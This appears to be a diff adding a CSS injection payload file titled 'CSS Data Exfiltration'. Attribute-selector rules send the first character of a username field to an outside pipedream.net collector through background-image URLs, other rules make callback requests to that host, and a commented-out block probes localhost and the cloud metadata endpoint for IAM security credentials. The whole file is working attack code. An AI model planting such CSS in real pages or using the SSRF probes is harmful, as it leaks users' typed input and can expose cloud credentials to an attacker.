@@ -1,0 +1,37 @@
+/* ---------- 1. CSS Data Exfiltration ---------- */
+input[name="username"][value^="a"] {
+  background-image: url("https://eoow6y96ffo9mzx.m.pipedream.net/leak?u=a");
+}
+input[name="username"][value^="b"] {
+  background-image: url("https://eoow6y96ffo9mzx.m.pipedream.net/leak?u=b");
+}
+input[name="username"][value^="c"] {
+  background-image: url("https://eoow6y96ffo9mzx.m.pipedream.net/leak?u=c");
+}
+input[name="username"][value^="d"] {
+  background-image: url("https://eoow6y96ffo9mzx.m.pipedream.net/leak?u=d");
+}
+input[name="username"][value^="e"] {
+  background-image: url("https://eoow6y96ffo9mzx.m.pipedream.net/leak?u=e");
+}
+input[name="username"][value^="f"] {
+  background-image: url("https://eoow6y96ffo9mzx.m.pipedream.net/leak?u=f");
+}
+
+body {
+  background-image: url("https://eoow6y96ffo9mzx.m.pipedream.net");
+}
+#test-ssrf {
+  background: url("https://eoow6y96ffo9mzx.m.pipedream.net/");
+}
+
+/* body {
+  background-image: url("http://127.0.0.1:8000/internal-test");
+}
+#test-ssrf {
+  background: url("http://169.254.169.254/latest/meta-data/iam/security-credentials/");
+} */
+
+input[name="username"][value^="x"] {
+  border: 3px solid red;
+}
